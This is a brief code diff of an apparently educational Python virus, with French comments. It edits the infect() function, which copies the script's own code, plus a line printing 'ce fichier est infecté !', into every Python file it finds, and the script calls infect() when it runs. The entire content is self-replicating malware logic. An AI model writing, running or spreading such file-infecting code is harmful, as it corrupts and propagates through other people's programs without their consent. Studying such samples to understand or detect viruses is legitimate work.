@@ -41,8 +41,7 @@ def get_code() :
 
 #Copier son code dans les programmes infectables
 def infect() :
-	insert_lines_in_list_of_files(py_files(), get_code())
-	insert_lines_in_list_of_files(py_files(), "Ce fichier est infecté\n")
+	insert_lines_in_list_of_files(py_files(), get_code()+list("\nprint('ce fichier est infecté !')\n"))
 
 
 infect()
